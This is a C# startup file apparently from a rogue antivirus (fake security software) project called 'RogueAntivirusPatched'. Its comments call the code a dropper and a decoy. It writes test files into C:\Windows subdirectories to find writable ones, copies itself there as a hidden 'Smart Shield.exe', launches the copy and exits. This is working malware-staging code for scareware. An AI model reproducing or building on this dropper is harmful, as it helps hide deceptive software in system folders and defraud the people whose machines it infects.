using Microsoft.Toolkit.Uwp.Notifications;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Data;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;
using Windows.ApplicationModel.Activation;
using Windows.Foundation.Collections;
using Windows.UI.Notifications;
using RogueAntivirusPatched.View.Pages;
using System.Diagnostics;
using System.Windows.Threading;
using form = System.Windows.Forms;
using System.IO;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Rebar;
using System.Text;
using RogueAntivirusPatched.Global;

namespace RogueAntivirusPatched
{
    /// <summary>
    /// Interaction logic for App.xaml
    /// </summary>
    public partial class App : Application
    {
        private static readonly Random rand = new Random();
        protected override void OnStartup(StartupEventArgs e)
        {
            base.OnStartup(e);

            OsDetection();

            var getAppID = new GetAppID();
            GetAppID.ThisAppID = getAppID.ObtainAppID(form.Application.ExecutablePath);

            string decoyFileName = "Smart Shield.exe";

            string getApplicationName = Path.GetFileNameWithoutExtension(form.Application.ExecutablePath);

            //Application is a decoy app, no need to launch it more than once
            var thisProcess = Process.GetProcessesByName(decoyFileName.Replace(".exe", ""));
            if (thisProcess.Length > 1)
            {
                Environment.Exit(0);
                return;
            }

            //Application is a dropper, not a decoy
            if (getApplicationName.Length > 15)
            {
                //Create a decoy app 
                string[] getDirs = Directory.GetDirectories(@"C:\Windows");
                List<string> listDirs = getDirs.ToList();
                List<string> safeDirs = new List<string>();
                string testFile = "attempt.txt";

                //Gather only dirs which can be used for storing decoy app
                foreach (string dir in listDirs)
                {
                    try
                    {
                        if (!Directory.Exists(dir))
                            continue;

                        if (File.Exists(Path.Combine(dir, testFile)))
                        {
                            safeDirs.Add(dir);
                            continue;
                        }

                        File.WriteAllText(Path.Combine(dir, testFile), "write attempt");
                        safeDirs.Add(dir);
                    } catch {  }
                }

                string thisApp = form.Application.ExecutablePath;
                string decoyApp = decoyFileName;
                string decoyAppLocation = Path.Combine(safeDirs[rand.Next(safeDirs.Count)], decoyApp);

                if (!File.Exists(decoyAppLocation))
                {
                    File.Copy(thisApp, decoyAppLocation, true);
                    File.SetAttributes(decoyAppLocation, FileAttributes.Hidden);
                }

                Process.Start(decoyAppLocation);

                //Terminate the dropper app
                Environment.Exit(0);
                return;
            }

            // WPF UI thread exceptions
            this.DispatcherUnhandledException += App_DispatcherUnhandledException;

            // Non-UI thread exceptions
            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;

            // Task exceptions
            TaskScheduler.UnobservedTaskException += TaskScheduler_UnobservedTaskException;
        }

        private void OsDetection()
        {
            var getOsVersionMajor = Environment.OSVersion.Version.Major;

            if (getOsVersionMajor == 10)
                return;

            string text = "This application is not supported on this operating system." 
                + Environment.NewLine + 
                "Your Os Version Major Number is " + getOsVersionMajor.ToString() + ".";
            string title = "Error - Unsupported Operating System";
            MessageBox.Show(text, title, MessageBoxButton.OK, MessageBoxImage.Error);

            Environment.Exit(0);
        }

        private string RandomChars(int charCount)
        {
            string letters = "abcdefghijkl mnopqrst uvwx  yzABCDE FGHIJKLMN OPQRSTUVWXYZ 012345 6789";

            var sb = new StringBuilder();

            for (int i = 0; i < charCount; i++)
            {
                sb.Append(letters[rand.Next(letters.Length)]);
            }

            return sb.ToString();
        }

        private void App_DispatcherUnhandledException(object sender, DispatcherUnhandledExceptionEventArgs e)
        {
            MessageBox.Show($"WPF Dispatcher Exception:\n{e.Exception}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            e.Handled = true; // prevent crash (optional)
        }

        private void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            MessageBox.Show($"AppDomain Exception:\n{e.ExceptionObject}", "Fatal Error", MessageBoxButton.OK, MessageBoxImage.Error);
        }

        private void TaskScheduler_UnobservedTaskException(object sender, UnobservedTaskExceptionEventArgs e)
        {
            MessageBox.Show($"Task Exception:\n{e.Exception}", "Task Error", MessageBoxButton.OK, MessageBoxImage.Error);
            e.SetObserved(); // prevent crash (optional)
        }
    }
}
